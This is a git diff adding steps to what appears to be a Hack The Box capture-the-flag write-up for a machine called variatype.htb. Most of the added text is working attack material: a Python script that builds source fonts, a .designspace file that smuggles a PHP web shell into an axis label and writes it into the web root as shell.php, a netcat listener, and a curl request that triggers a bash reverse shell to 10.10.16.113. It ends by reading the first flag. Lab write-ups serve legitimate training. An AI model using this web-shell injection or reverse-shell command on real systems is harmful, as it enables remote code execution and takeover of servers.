@@ -107,19 +107,116 @@ git show HEAD
 <img width="1534" height="457" alt="image" src="https://github.com/user-attachments/assets/44b69b6e-ea58-4f27-9cbf-8e4636d05164" />
 
 
+## nano cve.py
+
+
+```
+         
+#!/usr/bin/env python3
+from fontTools.fontBuilder import FontBuilder
+from fontTools.pens.ttGlyphPen import TTGlyphPen
+
+def create_source_font(filename, weight=400):
+    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
+
+    fb.setupGlyphOrder([".notdef"])
+    fb.setupCharacterMap({})
+
+    pen = TTGlyphPen(None)
+    pen.moveTo((0, 0))
+    pen.lineTo((500, 0))
+    pen.lineTo((500, 500))
+    pen.lineTo((0, 500))
+    pen.closePath()
+
+    glyph = pen.glyph()
+
+    fb.setupGlyf({".notdef": glyph})
+    fb.setupHorizontalMetrics({".notdef": (500, 0)})
+    fb.setupHorizontalHeader(ascent=800, descent=-200)
+    fb.setupOS2(usWeightClass=weight)
+    fb.setupPost()
+    fb.setupNameTable({"familyName": "ExploitFont", "styleName": f"Weight{weight}"})
+
+    fb.save(filename)
+    print(f"[+] Created {filename}")
+
+if __name__ == "__main__":
+    print("[+] Generating source fonts for VariaType exploit...")
+    create_source_font("source-light.ttf", weight=100)
+    create_source_font("source-regular.ttf", weight=400)
+    print("[+] Fonts ready! Upload to: http://variatype.htb/tools/variable-font-generator")
+```
+
+
+## nano exploit.designspace
+
+```
+<?xml version='1.0' encoding='UTF-8'?>
+<designspace format="5.0">
+  <axes>
+    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
+      <labelname xml:lang="fr">Regular</labelname>
+    </axis>
+  </axes>
+  <sources>
+    <source filename="source-light.ttf" name="Light">
+      <location><dimension name="Weight" xvalue="100"/></location>
+    </source>
+    <source filename="source-regular.ttf" name="Regular">
+      <location><dimension name="Weight" xvalue="400"/></location>
+    </source>
+  </sources>
+  <variable-fonts>
+    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
+      <axis-subsets>
+        <axis-subset name="Weight"/>
+      </axis-subsets>
+    </variable-font>
+  </variable-fonts>
+</designspace>
+```
 
 
 
+```
+python3 cve.py
+```
+
+
+<img width="1045" height="242" alt="image" src="https://github.com/user-attachments/assets/a4795415-683f-430b-9e67-668c8a05b1b0" />
+
+
+## open **`http://variatype.htb`**
+
+
+> upload exploit.designspace in first feilds and other two files in nexst field
+
+
+## now check if font created  
+
+
+<img width="1919" height="558" alt="image" src="https://github.com/user-attachments/assets/ca5b9500-eac9-4f18-93bb-07c088c8fdfd" />
 
 
 
+```
+nc -lnvp 2222
+
+ curl http://portal.variatype.htb/files/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.113/2222%200%3E%261%27
 
 
+```
 
 
+<img width="910" height="181" alt="image" src="https://github.com/user-attachments/assets/356cf879-583d-41bf-b894-ea1a3b2d140c" />
 
 
+## try to get first flag from steve 
 
+
+<img width="757" height="180" alt="image" src="https://github.com/user-attachments/assets/55dd8eae-8ee2-4aa7-bdda-10bfd8552e68" />
 
 
 
